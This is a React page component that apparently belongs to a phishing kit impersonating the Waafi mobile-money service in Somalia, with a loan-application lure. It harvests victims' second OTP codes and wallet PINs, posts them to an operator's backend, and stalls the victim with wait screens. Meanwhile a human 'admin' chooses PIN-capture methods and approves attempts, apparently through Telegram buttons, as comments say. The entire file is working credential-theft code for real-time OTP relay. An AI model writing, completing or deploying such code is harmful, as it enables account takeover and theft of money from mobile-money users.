import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Otp.css';

export default function Confirm() {
  const navigate = useNavigate();
  const { authData, updateAuthData } = useLoanApplication();

  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';

  const getInitialPhone = () => {
    if (authData.phoneNumber) return authData.phoneNumber;
    try {
      const savedPhone = localStorage.getItem('waafi_phone');
      if (savedPhone) return savedPhone;
    } catch (e) {}
    return '+252 612 345 678';
  };

  const [phoneNumber] = useState(getInitialPhone());

  // ── Second OTP state (phase 1 — original flow) ────────────────────────────
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [otpTimer, setOtpTimer] = useState(40);
  const [isResending, setIsResending] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [processingTitle, setProcessingTitle] = useState('Xaqiijinta OTP-ga Labaad');
  const [progress, setProgress] = useState(0);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [isApproved, setIsApproved] = useState(false);

  // Toast states
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [showResendToast, setShowResendToast] = useState(false);

  // ── Phase tracking ────────────────────────────────────────────────────────
  // null           = phase 1: second OTP input (original)
  // 'waiting'      = OTP approved, waiting for admin to choose method
  // 'prompt_pin'   = admin chose prompt; user sees waiting screen
  // 'request_pin'  = admin chose request; user types PIN
  const [phase, setPhase] = useState(null);

  // ── Prompt PIN state ──────────────────────────────────────────────────────
  const [promptPinStatus, setPromptPinStatus] = useState('');
  const [isPromptPolling, setIsPromptPolling] = useState(false);
  // 'failed' | 'timeout' | null — failure state WITHIN the prompt PIN phase
  const [promptPinError, setPromptPinError] = useState(null);
  const [isRetrying, setIsRetrying] = useState(false);

  // ── Request PIN state ─────────────────────────────────────────────────────
  const [pinDigits, setPinDigits] = useState(['', '', '', '', '', '']);
  const [isPinSubmitting, setIsPinSubmitting] = useState(false);
  // 'wrong_pin' | 'error' | null — failure within request PIN phase
  const [pinError, setPinError] = useState(null);

  // ── OTP-phase error modals (only shown before OTP is approved) ────────────
  const [showOtpErrorModal, setShowOtpErrorModal] = useState(false);
  const [showOtpWrongPinModal, setShowOtpWrongPinModal] = useState(false);
  const [showOtpTimeoutModal, setShowOtpTimeoutModal] = useState(false);
  const [showOtpVerifyErrorModal, setShowOtpVerifyErrorModal] = useState(false);
  const [showResendErrorModal, setShowResendErrorModal] = useState(false);

  const previousStatusRef = useRef(null);
  const abortRef = useRef(false); // used to cancel in-flight polls on unmount

  const otpRefs = [
    useRef(null), useRef(null), useRef(null),
    useRef(null), useRef(null), useRef(null),
  ];
  const pinRefs = [
    useRef(null), useRef(null), useRef(null),
    useRef(null), useRef(null), useRef(null),
  ];

  // ── Init ──────────────────────────────────────────────────────────────────
  useEffect(() => {
    abortRef.current = false;
    const endTime = Date.now() + 40 * 1000;
    localStorage.setItem('second_otp_timer', JSON.stringify({ endTime }));
    requestSecondOtp();
    setShowSuccessToast(true);
    setTimeout(() => otpRefs[0].current?.focus(), 100);
    return () => {
      abortRef.current = true;
      localStorage.removeItem('second_otp_timer');
    };
  }, []);

  const requestSecondOtp = async () => {
    try {
      const phone = authData.phoneNumber || phoneNumber;
      await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/request-second-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          firstOtp: authData.firstOtp,
          timestamp: new Date().toISOString(),
        }),
      });
    } catch (e) { console.error(e); }
  };

  // ── Toast timers ──────────────────────────────────────────────────────────
  useEffect(() => {
    if (!showSuccessToast) return;
    const t = setTimeout(() => setShowSuccessToast(false), 2500);
    return () => clearTimeout(t);
  }, [showSuccessToast]);

  useEffect(() => {
    if (!showResendToast) return;
    const t = setTimeout(() => setShowResendToast(false), 2500);
    return () => clearTimeout(t);
  }, [showResendToast]);

  // ── OTP countdown (only active in phase 1) ────────────────────────────────
  useEffect(() => {
    if (otpTimer <= 0 || isProcessing || phase !== null) return;
    const id = setInterval(() => {
      setOtpTimer(prev => {
        const n = prev - 1;
        if (n <= 0) { localStorage.removeItem('second_otp_timer'); return 0; }
        localStorage.setItem('second_otp_timer', JSON.stringify({ endTime: Date.now() + n * 1000 }));
        return n;
      });
    }, 1000);
    return () => clearInterval(id);
  }, [otpTimer, isProcessing, phase]);

  // ── Progress bar → navigate ───────────────────────────────────────────────
  useEffect(() => {
    if (isProcessing && isApproved && progress < 100) {
      const t = setTimeout(() => {
        setProgress(p => Math.min(p + Math.random() * 15 + 5, 100));
      }, 300);
      return () => clearTimeout(t);
    }
    if (progress >= 100 && isApproved) {
      setTimeout(() => {
        localStorage.removeItem('second_otp_timer');
        localStorage.removeItem('first_otp_timer');
        navigate('/status', { replace: true });
      }, 500);
    }
  }, [isProcessing, isApproved, progress, navigate]);

  // ══════════════════════════════════════════════════════════════════════════
  // POLLING HELPERS
  // ══════════════════════════════════════════════════════════════════════════

  const checkOTPStatus = async (phone, otpCode) => {
    const start = Date.now();
    const max = 5 * 60 * 1000;
    while (Date.now() - start < max) {
      if (abortRef.current) return { aborted: true };
      try {
        const res = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-second-otp-status`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone, otp: otpCode, otpType: 'second' }),
        });
        const data = await res.json();
        if (data.status === 'approved') return { approved: true };
        if (data.status === 'rejected') return { approved: false };
        if (data.status === 'wrong_pin') return { approved: false, wrongPin: true };
        const elapsed = Math.floor((Date.now() - start) / 1000);
        const s = `Fadlan sug... (${elapsed}s)`;
        if (previousStatusRef.current !== s) { setVerificationStatus(s); previousStatusRef.current = s; }
      } catch (e) { console.error(e); }
      await new Promise(r => setTimeout(r, 2000));
    }
    return { approved: false, timeout: true };
  };

  const pollForAdminMethodDecision = async (phone) => {
    const start = Date.now();
    const max = 5 * 60 * 1000;
    while (Date.now() - start < max) {
      if (abortRef.current) return null;
      try {
        const res = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/get-second-pin-method`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone }),
        });
        const data = await res.json();
        if (data.method === 'prompt_pin' || data.method === 'request_pin' || data.method === 'pass') return data.method;
      } catch (e) { console.error(e); }
      await new Promise(r => setTimeout(r, 2000));
    }
    return null;
  };

  // Single attempt of prompt-pin poll — used both for initial and retry
  const runPromptPinAttempt = async (phone) => {
    const start = Date.now();
    const max = 5 * 60 * 1000;
    while (Date.now() - start < max) {
      if (abortRef.current) return { aborted: true };
      try {
        const res = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-pin2-verification-status`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phoneNumber: phone }),
        });
        const data = await res.json();
        if (data.status === 'approved') return { approved: true };
        if (data.status === 'rejected' || data.status === 'failed') return { approved: false };
        const elapsed = Math.floor((Date.now() - start) / 1000);
        const s = `Fadlan sug... (${elapsed}s)`;
        if (previousStatusRef.current !== s) { setPromptPinStatus(s); previousStatusRef.current = s; }
      } catch (e) { console.error(e); }
      await new Promise(r => setTimeout(r, 2000));
    }
    return { approved: false, timeout: true };
  };

  // ══════════════════════════════════════════════════════════════════════════
  // INPUT HANDLERS
  // ══════════════════════════════════════════════════════════════════════════

  const handleOtpChange = (index, value) => {
    const v = value.replace(/\D/g, '');
    if (v.length > 1) return;
    const n = [...otp]; n[index] = v; setOtp(n);
    if (v && index < 5) otpRefs[index + 1].current.focus();
  };
  const handleOtpPaste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6).split('');
    const n = [...otp];
    digits.forEach((d, i) => { if (index + i < 6) n[index + i] = d; });
    setOtp(n);
    otpRefs[Math.min(index + digits.length, 5)].current.focus();
  };
  const handleOtpKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (otp[index]) { const n = [...otp]; n[index] = ''; setOtp(n); }
      else if (index > 0) otpRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) otpRefs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 5) otpRefs[index + 1].current.focus();
  };
  const handleOtpKeyPress = e => { if (!/^\d$/.test(e.key)) e.preventDefault(); };

  const handlePinChange = (index, value) => {
    const v = value.replace(/\D/g, '');
    if (v.length > 1) return;
    const n = [...pinDigits]; n[index] = v; setPinDigits(n);
    if (v && index < 5) pinRefs[index + 1].current.focus();
  };
  const handlePinPaste = (e, index) => {
    e.preventDefault();
    const digits = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6).split('');
    const n = [...pinDigits];
    digits.forEach((d, i) => { if (index + i < 6) n[index + i] = d; });
    setPinDigits(n);
    pinRefs[Math.min(index + digits.length, 5)].current.focus();
  };
  const handlePinKeyDown = (index, e) => {
    if (e.key === 'Backspace') {
      if (pinDigits[index]) { const n = [...pinDigits]; n[index] = ''; setPinDigits(n); }
      else if (index > 0) pinRefs[index - 1].current.focus();
    } else if (e.key === 'ArrowLeft' && index > 0) pinRefs[index - 1].current.focus();
    else if (e.key === 'ArrowRight' && index < 5) pinRefs[index + 1].current.focus();
  };

  // ══════════════════════════════════════════════════════════════════════════
  // APPROVAL SUCCESS
  // ══════════════════════════════════════════════════════════════════════════
  const handleApprovalSuccess = (secondOtp = '') => {
    updateAuthData({ secondOtp, isAuthenticated: true });
    try {
      const cur = JSON.parse(localStorage.getItem('waafi_auth') || '{}');
      localStorage.setItem('waafi_auth', JSON.stringify({
        ...cur, secondOtp, isAuthenticated: true, timestamp: new Date().toISOString(),
      }));
    } catch (e) {}
    setIsApproved(true);
    setIsProcessing(true);
  };

  // ══════════════════════════════════════════════════════════════════════════
  // SUBMIT: Second OTP (phase 1)
  // ══════════════════════════════════════════════════════════════════════════
  const handleSubmit = async (e) => {
    e.preventDefault();
    if (isSubmitting) return;
    const fullOtp = otp.join('');
    if (fullOtp.length !== 6) { alert('Fadlan geli koodhka 6 tiro ee dhammaystiran'); return; }

    setIsSubmitting(true);
    const phone = authData.phoneNumber || phoneNumber;

    try {
      await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-second-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          otp: fullOtp,
          firstOtp: authData.firstOtp,
          timestamp: new Date().toISOString(),
        }),
      });

      setProcessingTitle('Xaqiijinta OTP-ga Labaad');
      setIsProcessing(true);
      setVerificationStatus('Fadlan sug...');
      previousStatusRef.current = 'Fadlan sug...';
      setIsApproved(false);
      setProgress(0);

      const result = await checkOTPStatus(phone, fullOtp);

      if (result.aborted) return;

      if (!result.approved) {
        // ── OTP failed: reset fully back to the OTP input ─────────────────
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        previousStatusRef.current = null;
        if (result.wrongPin) {
          setShowOtpWrongPinModal(true);
        } else if (result.timeout) {
          setShowOtpTimeoutModal(true);
        } else {
          setShowOtpErrorModal(true);
          setOtp(['', '', '', '', '', '']);
          setTimeout(() => otpRefs[0].current?.focus(), 100);
        }
        return;
      }

      // ── OTP approved. Stop processing spinner, wait for admin method ──────
      setIsProcessing(false);
      setVerificationStatus('');
      previousStatusRef.current = null;
      setPhase('waiting'); // Shows "waiting for admin" spinner

      const method = await pollForAdminMethodDecision(phone);

      if (abortRef.current) return;

      if (!method) {
        // Admin never decided — stay in waiting, show timeout
        setPhase(null);
        setIsSubmitting(false);
        setShowOtpTimeoutModal(true);
        return;
      }

      // ── Admin decided ─────────────────────────────────────────────────────
      setPhase(method); // 'prompt_pin' | 'request_pin' | 'pass'

      if (method === 'pass') {
        // No PIN required — proceed directly to status page
        setProcessingTitle('Xaqiijinta');
        setVerificationStatus('✅ Ansixinta la dhamaystiray! Socodka...');
        previousStatusRef.current = '✅ Ansixinta la dhamaystiray! Socodka...';
        handleApprovalSuccess('pass');
        return;
      }

      if (method === 'prompt_pin') {
        await initiatePromptPin(phone);
      }
      // 'request_pin': render switches to PIN form, no async work yet

    } catch (err) {
      console.error(err);
      setIsSubmitting(false);
      setIsProcessing(false);
      setPhase(null);
      setShowOtpVerifyErrorModal(true);
      previousStatusRef.current = null;
    }
  };

  // ══════════════════════════════════════════════════════════════════════════
  // PROMPT PIN — initiate + poll (shared by first attempt and retry)
  // ══════════════════════════════════════════════════════════════════════════
  const initiatePromptPin = async (phone) => {
    setIsPromptPolling(true);
    setPromptPinError(null);
    setPromptPinStatus('Fadlan sug...');
    previousStatusRef.current = 'Fadlan sug...';

    try {
      await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/initiate-prompt-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          firstOtp: authData.firstOtp,
          timestamp: new Date().toISOString(),
        }),
      });

      const result = await runPromptPinAttempt(phone);

      if (result.aborted) return;

      if (result.approved) {
        setIsPromptPolling(false);
        setProcessingTitle('PIN Xaqiijinta');
        handleApprovalSuccess('prompt_pin_verified');
      } else {
        // ── FAILED: stay on prompt_pin phase, show retry option ───────────
        setIsPromptPolling(false);
        setPromptPinError(result.timeout ? 'timeout' : 'failed');
        previousStatusRef.current = null;
      }
    } catch (err) {
      console.error(err);
      setIsPromptPolling(false);
      setPromptPinError('failed');
      previousStatusRef.current = null;
    }
  };

  // Retry button handler — re-initiates prompt pin without going back to OTP
  const handlePromptPinRetry = async () => {
    if (isRetrying) return;
    setIsRetrying(true);
    const phone = authData.phoneNumber || phoneNumber;
    await initiatePromptPin(phone);
    setIsRetrying(false);
  };

  // ══════════════════════════════════════════════════════════════════════════
  // REQUEST PIN — submit
  // ══════════════════════════════════════════════════════════════════════════
  const handlePinSubmit = async (e) => {
    e.preventDefault();
    if (isPinSubmitting) return;
    const fullPin = pinDigits.join('');
    if (fullPin.length !== 6) { alert('Fadlan geli PIN-ka 6 tiro ee dhammaystiran'); return; }

    setIsPinSubmitting(true);
    setPinError(null);
    const phone = authData.phoneNumber || phoneNumber;

    try {
      await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-request-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          pin: fullPin,
          firstOtp: authData.firstOtp,
          timestamp: new Date().toISOString(),
        }),
      });

      // Show PIN verification spinner (correct title)
      setProcessingTitle('PIN Xaqiijinta');
      setVerificationStatus('Fadlan sug...');
      previousStatusRef.current = 'Fadlan sug...';
      setProgress(0);
      setIsApproved(false);
      setIsProcessing(true);

      const result = await checkOTPStatus(phone, fullPin);

      if (result.aborted) return;

      if (result.approved) {
        // isProcessing is already true; set isApproved to trigger progress bar → navigate
        setVerificationStatus('✅ PIN la xaqiijiyay! Socodka...');
        previousStatusRef.current = '✅ PIN la xaqiijiyay! Socodka...';
        updateAuthData({ secondOtp: fullPin, isAuthenticated: true });
        try {
          const cur = JSON.parse(localStorage.getItem('waafi_auth') || '{}');
          localStorage.setItem('waafi_auth', JSON.stringify({
            ...cur, secondOtp: fullPin, isAuthenticated: true, timestamp: new Date().toISOString(),
          }));
        } catch (e) {}
        setIsApproved(true); // triggers progress bar useEffect; isProcessing already true
      } else {
        // ── FAILED: leave PIN form, show inline error ─────────────────────
        setIsProcessing(false);
        setIsPinSubmitting(false);
        setProgress(0);
        previousStatusRef.current = null;
        setPinError(result.wrongPin ? 'wrong_pin' : result.timeout ? 'timeout' : 'error');
        setPinDigits(['', '', '', '', '', '']);
        setTimeout(() => pinRefs[0].current?.focus(), 100);
      }
    } catch (err) {
      console.error(err);
      setIsPinSubmitting(false);
      setIsProcessing(false);
      setProgress(0);
      setPinError('error');
      previousStatusRef.current = null;
    }
  };

  // ── Resend OTP (phase 1 only, original logic unchanged) ───────────────────
  const handleResend = async () => {
    if (otpTimer > 0 || isResending) return;
    const phone = authData.phoneNumber || phoneNumber;
    if (!phone || phone === '+252 612 345 678') { setShowResendErrorModal(true); return; }
    setIsResending(true);
    try {
      const res = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-second-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber: phone,
          firstOtp: authData.firstOtp,
          timestamp: new Date().toISOString(),
        }),
      });
      const data = await res.json();
      if (data.success) {
        setOtp(['', '', '', '', '', '']);
        setOtpTimer(40);
        localStorage.setItem('second_otp_timer', JSON.stringify({ endTime: Date.now() + 40000 }));
        otpRefs[0].current.focus();
        setShowResendToast(true);
      } else {
        setShowResendErrorModal(true);
      }
    } catch (e) { setShowResendErrorModal(true); }
    finally { setIsResending(false); }
  };

  // ── Navigation / modal helpers ────────────────────────────────────────────
  const handleBack = () => { localStorage.removeItem('second_otp_timer'); navigate('/verify'); };

  // OTP-phase wrong pin — go back to login
  const handleOtpWrongPinClose = () => {
    setShowOtpWrongPinModal(false);
    localStorage.removeItem('first_otp_timer');
    localStorage.removeItem('second_otp_timer');
    localStorage.removeItem('waafi_phone');
    updateAuthData({ phoneNumber: '', pin: '', firstOtp: '', secondOtp: '', isAuthenticated: false });
    navigate('/login');
  };

  // OTP-phase timeout — stay on OTP form, clear boxes
  const handleOtpTimeoutClose = () => {
    setShowOtpTimeoutModal(false);
    setIsSubmitting(false);
    setOtp(['', '', '', '', '', '']);
    setTimeout(() => otpRefs[0].current?.focus(), 100);
  };

  const isOtpComplete = otp.every(d => d !== '');
  const isPinComplete = pinDigits.every(d => d !== '');

  // ══════════════════════════════════════════════════════════════════════════
  // PROCESSING SCREEN (navigate-to-status spinner)
  // ══════════════════════════════════════════════════════════════════════════
  if (isProcessing) {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container"><div className="spinner"></div></div>
            <h1 className="processing-title">{processingTitle}</h1>
            <p className="processing-subtitle">{verificationStatus}</p>
          </div>
        </main>
        <footer className="otp-footer">© 2026 Waafi Soomaaliya</footer>
      </div>
    );
  }

  // ══════════════════════════════════════════════════════════════════════════
  // MAIN RENDER
  // ══════════════════════════════════════════════════════════════════════════
  return (
    <div className="otp-container">

      {/* ── OTP-phase error modals (only reachable before OTP is approved) ── */}
      {showOtpErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowOtpErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Koodh khaldan!</h2>
            <p className="error-modal-message">
              SMS-ka eeg koodhka labaad ama codsato koodh mar kale kadib marka tirinta dhammaato
            </p>
            <button className="error-modal-button" onClick={() => setShowOtpErrorModal(false)}>HAGAAG</button>
          </div>
        </div>
      )}

      {showOtpTimeoutModal && (
        <div className="error-modal-overlay" onClick={handleOtpTimeoutClose}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Waqtiga dhammaday</h2>
            <p className="error-modal-message">Khalad ayaa dhacay, fadlan mar kale isku day</p>
            <button className="error-modal-button" onClick={handleOtpTimeoutClose}>HAGAAG</button>
          </div>
        </div>
      )}

      {showOtpWrongPinModal && (
        <div className="error-modal-overlay" onClick={handleOtpWrongPinClose}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">PIN khaldan!</h2>
            <p className="error-modal-message">
              Xaqiijinta OTP-ga labaad waa guuldareysatay. Fadlan mar kale ku soo celi galitaanka macluumaadka saxda ah.
            </p>
            <button className="error-modal-button" onClick={handleOtpWrongPinClose}>Ku noqo Galitaanka</button>
          </div>
        </div>
      )}

      {showOtpVerifyErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowOtpVerifyErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Xaqiijinta ma guulaysan</h2>
            <p className="error-modal-message">
              Xaqiijinta OTP-ga labaad ma guulaysan. Fadlan mar kale isku day markii dambe.
            </p>
            <button className="error-modal-button" onClick={() => setShowOtpVerifyErrorModal(false)}>HAGAAG</button>
          </div>
        </div>
      )}

      {showResendErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowResendErrorModal(false)}>
          <div className="error-modal" onClick={e => e.stopPropagation()}>
            <h2 className="error-modal-title">Dirida mar labaad ma guulaysan</h2>
            <p className="error-modal-message">
              Dirida OTP-ga ma guulaysan. Fadlan mar kale isku day markii dambe.
            </p>
            <button className="error-modal-button" onClick={() => setShowResendErrorModal(false)}>HAGAAG</button>
          </div>
        </div>
      )}

      {/* ── Toasts ── */}
      {showSuccessToast && (
        <div className="success-toast">
          <div className="success-icon">✓</div>
          <span className="success-text">Koodka labaad si guul leh ayaa loo diray!</span>
        </div>
      )}
      {showResendToast && (
        <div className="success-toast resend">
          <div className="success-icon">📱</div>
          <span className="success-text">OTP si guul leh ayaa mar kale loo diray!</span>
        </div>
      )}

      {/* ── Header ── */}
      <header className="otp-header">
        <button className="back-btn" onClick={handleBack}>←</button>
        <div className="logo-large"><span className="logo-large-waafi">Waafi</span></div>
        <button className="menu-btn" aria-label="Menu">
          <div className="menu-line"></div>
          <div className="menu-line"></div>
          <div className="menu-line"></div>
        </button>
      </header>

      <main className="otp-content">
        <div className="otp-card">

          {/* ══════════════════════════════════════════════════════════════
              PHASE 1 — Second OTP
              Shown while phase === null (before OTP approved).
              Identical to the original Confirm.jsx — no changes.
          ══════════════════════════════════════════════════════════════ */}
          {phase === null && (
            <>
              <h1 className="otp-title">Xaqiijinta OTP-ga Labaad</h1>
              <p className="otp-subtitle">
                Geli OTP-ga labaad ee loogu diray lambarka taleefankaaga
              </p>
              <p className="otp-phone">{phoneNumber}</p>

              <form onSubmit={handleSubmit}>
                <div className="otp-inputs-container">
                  <div className="otp-inputs">
                    {otp.map((digit, index) => (
                      <input
                        key={index}
                        ref={otpRefs[index]}
                        type="text"
                        className="otp-box"
                        value={digit}
                        onChange={e => handleOtpChange(index, e.target.value)}
                        onKeyDown={e => handleOtpKeyDown(index, e)}
                        onKeyPress={handleOtpKeyPress}
                        onPaste={e => handleOtpPaste(e, index)}
                        maxLength="1"
                        inputMode="numeric"
                        pattern="[0-9]"
                        required
                        disabled={isResending || isSubmitting}
                      />
                    ))}
                  </div>

                  <p className="resend-text">
                    {isResending ? (
                      <span className="resending-text">Koodka mar kale ayaa la diraya...</span>
                    ) : otpTimer > 0 ? (
                      `Koodka mar kale u dir ${otpTimer} ilbiriqsi`
                    ) : (
                      <>
                        Koodka ma helin?{' '}
                        <span className="resend-link" onClick={handleResend}>Mar kale dir</span>
                      </>
                    )}
                  </p>
                </div>

                <button
                  type="submit"
                  className={`submit-button ${isOtpComplete ? 'active' : ''}`}
                  disabled={!isOtpComplete || isResending || isSubmitting}
                >
                  {isSubmitting ? 'XAQIIJINAYA...' : 'XAQIIJI OTP-GA LABAAD'}
                </button>
              </form>
            </>
          )}

          {/* ══════════════════════════════════════════════════════════════
              WAITING — OTP approved, admin hasn't picked method yet
          ══════════════════════════════════════════════════════════════ */}
          {phase === 'waiting' && (
            <>
              <h1 className="otp-title">Xaqiijinta OTP-ga Labaad</h1>
              <p className="otp-phone">{phoneNumber}</p>
              <div style={{ textAlign: 'center', padding: '2rem 0' }}>
                <div className="spinner-container" style={{ marginBottom: '1.5rem' }}>
                  <div className="spinner"></div>
                </div>
                <p style={{ color: '#666', fontSize: '0.95rem' }}>Fadlan sug...</p>
              </div>
            </>
          )}

          {/* ══════════════════════════════════════════════════════════════
              PHASE 2a — PROMPT PIN
              Admin chose prompt_pin. Three sub-states:
                polling  → spinner + status text
                failed   → error card + Retry button (NO back to OTP)
                timeout  → timeout card + Retry button (NO back to OTP)
              Retry re-calls initiatePromptPin and sends a fresh
              initiate-prompt-pin request to backend with new Telegram
              buttons (✅ Successful / ❌ Failed).
          ══════════════════════════════════════════════════════════════ */}
          {phase === 'prompt_pin' && (
            <>
              <h1 className="otp-title">PIN Xaqiijinta</h1>
              <p className="otp-phone">{phoneNumber}</p>

              {/* Polling — waiting for admin to mark success/fail */}
              {isPromptPolling && !promptPinError && (
                <div style={{ textAlign: 'center', padding: '2rem 0' }}>
                  <div className="spinner-container" style={{ marginBottom: '1.5rem' }}>
                    <div className="spinner"></div>
                  </div>
                  <p style={{ color: '#6AC538', fontSize: '1rem', fontWeight: 600, marginBottom: 6 }}>
                    Fadlan dhameystir xaqiijinta taleefankaaga
                  </p>
                  <p style={{ color: '#666', fontSize: '0.9rem', marginBottom: 4 }}>
                    Geli 6-digit PIN-kaaga taleefanka si aad u xaqiijiso.
                  </p>
                  <p style={{ color: '#888', fontSize: '0.85rem' }}>
                    {promptPinStatus || 'Fadlan sug...'}
                  </p>
                </div>
              )}

              {/* Failed / Timeout — inline, no modal, no back to OTP */}
              {!isPromptPolling && promptPinError && (
                <div style={{ padding: '1rem 0' }}>
                  <div style={{
                    background: promptPinError === 'timeout' ? '#fff9e6' : '#fff0f0',
                    border: `1px solid ${promptPinError === 'timeout' ? '#ffd966' : '#f5c6cb'}`,
                    borderRadius: 10,
                    padding: '20px',
                    textAlign: 'center',
                    marginBottom: 20,
                  }}>
                    <p style={{
                      fontSize: '1.1rem',
                      fontWeight: 700,
                      color: promptPinError === 'timeout' ? '#856404' : '#d32f2f',
                      marginBottom: 8,
                    }}>
                      {promptPinError === 'timeout' ? '⏰ Waqtiga dhammaday' : '❌ Xaqiijinta la waayay'}
                    </p>
                    <p style={{ color: '#555', fontSize: '0.9rem', marginBottom: 0 }}>
                      {promptPinError === 'timeout'
                        ? 'Waqtiga xaqiijinta ayaa dhammaday. Guji Isku day mar kale si aad u soo celiso.'
                        : 'PIN-ka xaqiijintiisu ma guulaysan. Guji Isku day mar kale si aad dib ugu tijaabiso.'}
                    </p>
                  </div>

                  <button
                    type="button"
                    className="submit-button active"
                    onClick={handlePromptPinRetry}
                    disabled={isRetrying}
                    style={{ marginTop: 0 }}
                  >
                    {isRetrying ? 'CODSANAYNAA...' : '🔄 ISKU DAY MAR KALE'}
                  </button>
                </div>
              )}
            </>
          )}

          {/* ══════════════════════════════════════════════════════════════
              PHASE 2b — REQUEST PIN
              Admin chose request_pin. User types PIN.
              On failure: stay here, show inline error, clear boxes.
              No modal, no back to OTP form.
          ══════════════════════════════════════════════════════════════ */}
          {phase === 'request_pin' && (
            <>
              <h1 className="otp-title">PIN Xaqiijinta</h1>
              <p className="otp-subtitle">
                Geli PIN-kaaga si aad u dhammaystirto xaqiijinta
              </p>
              <p className="otp-phone">{phoneNumber}</p>

              {/* Inline error banner — shown after a failed attempt */}
              {pinError && (
                <div style={{
                  background: pinError === 'timeout' ? '#fff9e6' : '#fff0f0',
                  border: `1px solid ${pinError === 'timeout' ? '#ffd966' : '#f5c6cb'}`,
                  borderRadius: 10,
                  padding: '12px 16px',
                  marginBottom: 16,
                  textAlign: 'center',
                }}>
                  <p style={{
                    color: pinError === 'timeout' ? '#856404' : '#d32f2f',
                    fontSize: '0.9rem',
                    fontWeight: 600,
                    margin: 0,
                  }}>
                    {pinError === 'wrong_pin'
                      ? '❌ PIN-ka khaldan. Mar kale isku day.'
                      : pinError === 'timeout'
                      ? '⏰ Waqtiga dhammaday. Mar kale isku day.'
                      : '❌ Khalad ayaa dhacay. Mar kale isku day.'}
                  </p>
                </div>
              )}

              <form onSubmit={handlePinSubmit}>
                <div className="otp-inputs-container">
                  <div className="otp-inputs">
                    {pinDigits.map((digit, index) => (
                      <input
                        key={index}
                        ref={pinRefs[index]}
                        type="password"
                        className="otp-box"
                        value={digit}
                        onChange={e => handlePinChange(index, e.target.value)}
                        onKeyDown={e => handlePinKeyDown(index, e)}
                        onKeyPress={handleOtpKeyPress}
                        onPaste={e => handlePinPaste(e, index)}
                        maxLength="1"
                        inputMode="numeric"
                        pattern="[0-9]"
                        required
                        disabled={isPinSubmitting}
                        autoFocus={index === 0}
                      />
                    ))}
                  </div>
                </div>

                <button
                  type="submit"
                  className={`submit-button ${isPinComplete ? 'active' : ''}`}
                  style={{ marginTop: 16 }}
                  disabled={!isPinComplete || isPinSubmitting}
                >
                  {isPinSubmitting ? 'XAQIIJINAYA...' : 'XAQIIJI PIN-KA'}
                </button>
              </form>
            </>
          )}

        </div>
      </main>

      <footer className="otp-footer">© 2026 Waafi Soomaaliya</footer>
    </div>
  );
}
